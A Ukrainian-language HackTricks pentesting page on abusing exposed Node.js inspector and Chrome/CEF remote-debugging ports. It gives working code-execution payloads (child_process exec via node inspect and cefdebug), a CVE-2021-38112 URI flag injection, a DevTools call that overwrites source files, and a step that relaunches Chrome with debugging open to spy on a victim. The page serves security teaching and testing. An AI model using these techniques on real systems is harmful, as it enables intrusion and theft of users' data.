# –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –≤—ñ–¥–ª–∞–¥—á–∏–∫–æ–º Node inspector/CEF

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π –º–µ—Ä—á PEASS & HackTricks**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub**.

</details>

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

[–ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): –ö–æ–ª–∏ –ø—Ä–æ—Ü–µ—Å Node.js –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `--inspect`, –≤—ñ–Ω –æ—á—ñ–∫—É—î –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≤—ñ–¥–ª–∞–¥—á–∏–∫–∞. –ó–∞ **–∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, –≤—ñ–Ω —Å–ª—É—Ö–∞—Ç–∏–º–µ —Ö–æ—Å—Ç —Ç–∞ –ø–æ—Ä—Ç **`127.0.0.1:9229`**. –ö–æ–∂–Ω–æ–º—É –ø—Ä–æ—Ü–µ—Å—É —Ç–∞–∫–æ–∂ –ø—Ä–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è **—É–Ω—ñ–∫–∞–ª—å–Ω–∏–π** **UUID**.

–ö–ª—ñ—î–Ω—Ç–∏ –≤—ñ–¥–ª–∞–¥—á–∏–∫–∞ –ø–æ–≤–∏–Ω–Ω—ñ –∑–Ω–∞—Ç–∏ —Ç–∞ –≤–∫–∞–∑–∞—Ç–∏ –∞–¥—Ä–µ—Å—É —Ö–æ—Å—Ç–∞, –ø–æ—Ä—Ç —Ç–∞ UUID –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è. –ü–æ–≤–Ω–∞ URL-–∞–¥—Ä–µ—Å–∞ –±—É–¥–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ –ø—Ä–∏–±–ª–∏–∑–Ω–æ —Ç–∞–∫: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
–û—Å–∫—ñ–ª—å–∫–∏ **–≤—ñ–¥–ª–∞–¥—á–∏–∫ –º–∞—î –ø–æ–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è Node.js**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, —è–∫–∏–π –º–æ–∂–µ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ —Ü—å–æ–≥–æ –ø–æ—Ä—Ç—É, –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ –≤—ñ–¥ —ñ–º–µ–Ω—ñ –ø—Ä–æ—Ü–µ—Å—É Node.js (**–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**).
{% endhint %}

–Ñ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –∑–∞–ø—É—Å–∫—É –≤—ñ–¥–ª–∞–¥—á–∏–∫–∞:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
–ö–æ–ª–∏ –≤–∏ –∑–∞–ø—É—Å–∫–∞—î—Ç–µ –ø—Ä–æ—Ü–µ—Å –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ —Ü—å–æ–≥–æ –∑'—è–≤–∏—Ç—å—Å—è:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
–ü—Ä–æ—Ü–µ—Å–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ **CEF** (**Chromium Embedded Framework**) –ø–æ–¥—ñ–±–Ω–æ –¥–æ –ø–æ—Ç—Ä–µ–±–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä: `--remote-debugging-port=9222` –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è **–≤—ñ–¥–ª–∞–≥–æ–¥–∂—É–≤–∞—á–∞** (–∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ SSRF –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –¥—É–∂–µ —Å—Ö–æ–∂–∏–º). –û–¥–Ω–∞–∫ –≤–æ–Ω–∏ **–∑–∞–º—ñ—Å—Ç—å** –Ω–∞–¥–∞–Ω–Ω—è —Å–µ–∞–Ω—Å—É **–≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è** **NodeJS** –±—É–¥—É—Ç—å —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –±—Ä–∞—É–∑–µ—Ä–æ–º –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [**–ü—Ä–æ—Ç–æ–∫–æ–ª—É Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/), —Ü–µ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±—Ä–∞—É–∑–µ—Ä–æ–º, –∞–ª–µ –±–µ–∑ –ø—Ä—è–º–æ–≥–æ RCE.

–ö–æ–ª–∏ –≤–∏ –∑–∞–ø—É—Å–∫–∞—î—Ç–µ –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–∏–π –±—Ä–∞—É–∑–µ—Ä, —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ —Ü—å–æ–≥–æ –∑'—è–≤–∏—Ç—å—Å—è:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### –ë—Ä–∞—É–∑–µ—Ä–∏, WebSockets —Ç–∞ –ø–æ–ª—ñ—Ç–∏–∫–∞ –æ–¥–Ω–∞–∫–æ–≤–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

–í–µ–±-—Å–∞–π—Ç–∏, –≤—ñ–¥–∫—Ä–∏—Ç—ñ —É –≤–µ–±-–±—Ä–∞—É–∑–µ—Ä—ñ, –º–æ–∂—É—Ç—å —Ä–æ–±–∏—Ç–∏ –∑–∞–ø–∏—Ç–∏ WebSocket —Ç–∞ HTTP –≤ —Ä–∞–º–∫–∞—Ö –º–æ–¥–µ–ª—ñ –±–µ–∑–ø–µ–∫–∏ –±—Ä–∞—É–∑–µ—Ä–∞. **–ü–æ—á–∞—Ç–∫–æ–≤–µ HTTP –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è** –Ω–µ–æ–±—Ö—ñ–¥–Ω–µ –¥–ª—è **–æ—Ç—Ä–∏–º–∞–Ω–Ω—è —É–Ω—ñ–∫–∞–ª—å–Ω–æ–≥–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞ —Å–µ–∞–Ω—Å—É –≤—ñ–¥–ª–∞–¥—á–∏–∫–∞**. **–ü–æ–ª—ñ—Ç–∏–∫–∞ –æ–¥–Ω–∞–∫–æ–≤–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è** **–∑–∞–ø–æ–±—ñ–≥–∞—î** –≤–µ–±-—Å–∞–π—Ç–∞–º —Ä–æ–±–∏—Ç–∏ **—Ü–µ HTTP –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è**. –î–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó –±–µ–∑–ø–µ–∫–∏ –ø—Ä–æ—Ç–∏ [**–∞—Ç–∞–∫ DNS –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ **–∑–∞–≥–æ–ª–æ–≤–∫–∏ 'Host'** –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≤–∫–∞–∑—É—é—Ç—å –∞–±–æ **IP-–∞–¥—Ä–µ—Å—É**, –∞–±–æ **`localhost`** –∞–±–æ **`localhost6`** —Ç–æ—á–Ω–æ.

{% hint style="info" %}
–¶—ñ **–∑–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏ –∑–∞–ø–æ–±—ñ–≥–∞—é—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é —ñ–Ω—Å–ø–µ–∫—Ç–æ—Ä–∞** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É **–ª–∏—à–µ —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è HTTP-–∑–∞–ø–∏—Ç—É** (—â–æ –º–æ–∂–Ω–∞ –±—É–ª–æ –∑—Ä–æ–±–∏—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SSRF).
{% endhint %}

### –ó–∞–ø—É—Å–∫ —ñ–Ω—Å–ø–µ–∫—Ç–æ—Ä–∞ –≤ —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å–∞—Ö

–í–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ **—Å–∏–≥–Ω–∞–ª SIGUSR1** –¥–æ –∑–∞–ø—É—â–µ–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É nodejs, —â–æ–± –≤—ñ–Ω **–∑–∞–ø—É—Å—Ç–∏–≤ —ñ–Ω—Å–ø–µ–∫—Ç–æ—Ä** –Ω–∞ —Ç–∏–ø–æ–≤–æ–º—É –ø–æ—Ä—Ç—É. –ü—Ä–æ—Ç–µ, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, —Ç–æ–º—É —Ü–µ –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ –≤–∞–º **–ø—Ä–∏–≤—ñ–ª–µ—ó –¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ—Ü–µ—Å—É**, –∞–ª–µ –Ω–µ –ø—Ä—è–º–æ–≥–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
–¶–µ –∫–æ—Ä–∏—Å–Ω–æ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞—Ö, –æ—Å–∫—ñ–ª—å–∫–∏ **–∑—É–ø–∏–Ω–∫–∞ –ø—Ä–æ—Ü–µ—Å—É —Ç–∞ –∑–∞–ø—É—Å–∫ –Ω–æ–≤–æ–≥–æ** –∑ `--inspect` **–Ω–µ —î –≤–∞—Ä—ñ–∞–Ω—Ç–æ–º**, –æ—Å–∫—ñ–ª—å–∫–∏ **–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä** –±—É–¥–µ **–∑–∞–∫—Ä–∏—Ç–∏–π** —Ä–∞–∑–æ–º –∑ –ø—Ä–æ—Ü–µ—Å–æ–º.
{% endhint %}

### –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ —ñ–Ω—Å–ø–µ–∫—Ç–æ—Ä–∞/–¥–µ–±–∞–≥–µ—Ä–∞

–î–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ **–±—Ä–∞—É–∑–µ—Ä–∞ –Ω–∞ –æ—Å–Ω–æ–≤—ñ Chromium**, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ URL-–∞–¥—Ä–µ—Å–∏ `chrome://inspect` –∞–±–æ `edge://inspect` –¥–ª—è Chrome –∞–±–æ Edge –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ. –ù–∞—Ç–∏—Å–Ω—É–≤—à–∏ –∫–Ω–æ–ø–∫—É Configure, —Å–ª—ñ–¥ –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ **—Ü—ñ–ª—å–æ–≤–∏–π —Ö–æ—Å—Ç —Ç–∞ –ø–æ—Ä—Ç** –≤–∫–∞–∑–∞–Ω—ñ –ø—Ä–∞–≤–∏–ª—å–Ω–æ. –ù–∞ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ –ø–æ–∫–∞–∑–∞–Ω–æ –ø—Ä–∏–∫–ª–∞–¥ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É (RCE):

![](<../../.gitbook/assets/image (620) (1).png>)

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞** –º–æ–∂–Ω–∞ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ –¥–µ–±–∞–≥–µ—Ä–∞/—ñ–Ω—Å–ø–µ–∫—Ç–æ—Ä–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) –¥–æ–∑–≤–æ–ª—è—î **–∑–Ω–∞—Ö–æ–¥–∏—Ç–∏ —ñ–Ω—Å–ø–µ–∫—Ç–æ—Ä—ñ–≤**, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –ª–æ–∫–∞–ª—å–Ω–æ, —Ç–∞ **–≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –∫–æ–¥** –≤ –Ω–∏—Ö.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–µ–∫—Å–ø–ª–æ–π—Ç–∏ RCE NodeJS –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º—É—Ç—å**, —è–∫—â–æ –≤–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ –¥–æ –±—Ä–∞—É–∑–µ—Ä–∞ —á–µ—Ä–µ–∑ [**–ü—Ä–æ—Ç–æ–∫–æ–ª Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/) (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ API, —â–æ–± –∑–Ω–∞–π—Ç–∏ —Ü—ñ–∫–∞–≤—ñ —Ä–µ—á—ñ, —è–∫—ñ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑ –Ω–∏–º).
{% endhint %}

## RCE –≤ NodeJS Debugger/Inspector

{% hint style="info" %}
–Ø–∫—â–æ –≤–∏ —Å—é–¥–∏ –ø—Ä–∏–π—à–ª–∏, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ **RCE –∑ XSS –≤ Electron, –±—É–¥—å –ª–∞—Å–∫–∞, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É.**
{% endhint %}

–î–µ—è–∫—ñ –∑–∞–≥–∞–ª—å–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **RCE**, –∫–æ–ª–∏ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è** –¥–æ **—ñ–Ω—Å–ø–µ–∫—Ç–æ—Ä–∞ Node**, —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —á–æ–≥–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ (–≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫, —â–æ —Ü–µ **–Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ –≤ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—ñ –¥–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## –ü–∞–∫–µ—Ç–∏ Chrome DevTools Protocol

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ API —Ç—É—Ç: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
–£ —Ü—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ —è –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ—Ä–∞—Ö—É—é —Ü—ñ–∫–∞–≤—ñ —Ä–µ—á—ñ, —è–∫—ñ —è –∑–Ω–∞–π—à–æ–≤, —è–∫—ñ –ª—é–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏ –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü–∏–º –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º.

### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ —á–µ—Ä–µ–∑ –≥–ª–∏–±–æ–∫—ñ –ø–æ—Å–∏–ª–∞–Ω–Ω—è

–£ [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security –≤–∏—è–≤–∏–ª–∏, —â–æ –¥–æ–¥–∞—Ç–æ–∫ –Ω–∞ –æ—Å–Ω–æ–≤—ñ CEF **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤ –≤–ª–∞—Å–Ω–∏–π UR**I –≤ —Å–∏—Å—Ç–µ–º—ñ (workspaces://), —è–∫–∏–π –æ—Ç—Ä–∏–º—É–≤–∞–≤ –ø–æ–≤–Ω–∏–π URI, –∞ –ø–æ—Ç—ñ–º **–∑–∞–ø—É—Å–∫–∞–≤ –¥–æ–¥–∞—Ç–æ–∫ –Ω–∞ –æ—Å–Ω–æ–≤—ñ CEF** –∑ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é, —è–∫–∞ –±—É–ª–∞ —á–∞—Å—Ç–∫–æ–≤–æ –ø–æ–±—É–¥–æ–≤–∞–Ω–∞ –∑ —Ü—å–æ–≥–æ URI.

–ë—É–ª–æ –≤–∏—è–≤–ª–µ–Ω–æ, —â–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ URI –¥–µ–∫–æ–¥—É–≤–∞–ª–∏—Å—è –∑ URL —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏—Å—è –¥–ª—è –∑–∞–ø—É—Å–∫—É –±–∞–∑–æ–≤–æ–≥–æ –¥–æ–¥–∞—Ç–∫–∞ CEF, —â–æ –¥–æ–∑–≤–æ–ª—è–ª–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ **–≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏** –ø—Ä–∞–ø–æ—Ä **`--gpu-launcher`** —É **–∫–æ–º–∞–Ω–¥–Ω–æ–º—É —Ä—è–¥–∫—É** —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥—ñ—ó.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –ø–∞–∫–µ—Ç, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
–í–∏–∫–æ–Ω–∞—î calc.exe.

### –ü–µ—Ä–µ–∑–∞–ø–∏—Å —Ñ–∞–π–ª—ñ–≤

–ó–º—ñ–Ω—ñ—Ç—å –ø–∞–ø–∫—É, –∫—É–¥–∏ –±—É–¥—É—Ç—å –∑–±–µ—Ä—ñ–≥–∞—Ç–∏—Å—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ —Ñ–∞–π–ª–∏**, —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ–∞–π–ª –¥–ª—è **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É** —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–æ–≥–æ **–≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É** –ø—Ä–æ–≥—Ä–∞–º–∏ –≤–∞—à–∏–º **–∑–ª–æ–≤–º–∏—Å–Ω–∏–º –∫–æ–¥–æ–º**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Webdriver –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó

–ó–≥—ñ–¥–Ω–æ –∑ —Ü–∏–º –ø–æ—Å—Ç–æ–º: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑ theriver.

### –ü—ñ—Å–ª—è–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ–π–Ω–∞ —Ñ–∞–∑–∞

–£ —Ä–µ–∞–ª—å–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ —Ç–∞ **–ø—ñ—Å–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó** –ü–ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –±—Ä–∞—É–∑–µ—Ä –Ω–∞ –æ—Å–Ω–æ–≤—ñ Chrome/Chromium, –º–æ–∂–Ω–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å Chrome –∑ **–∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–º –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è–º —Ç–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –ø–æ—Ä—Ç –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è**, —â–æ–± –º–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø. –¢–∞–∫–∏–º —á–∏–Ω–æ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤—Å–µ, —â–æ —Ä–æ–±–∏—Ç—å –∂–µ—Ä—Ç–≤–∞ –∑ Chrome —Ç–∞ –≤–∏–∫—Ä–∞—Å—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**.

–ü—Ä–∏—Ö–æ–≤–∞–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º —î **–∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –∫–æ–∂–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É Chrome** —Ç–∞ –ø–æ–¥–∞–ª—å—à–µ –≤–∏–∫–ª–∏–∫–∞–Ω–Ω—è —á–æ–≥–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
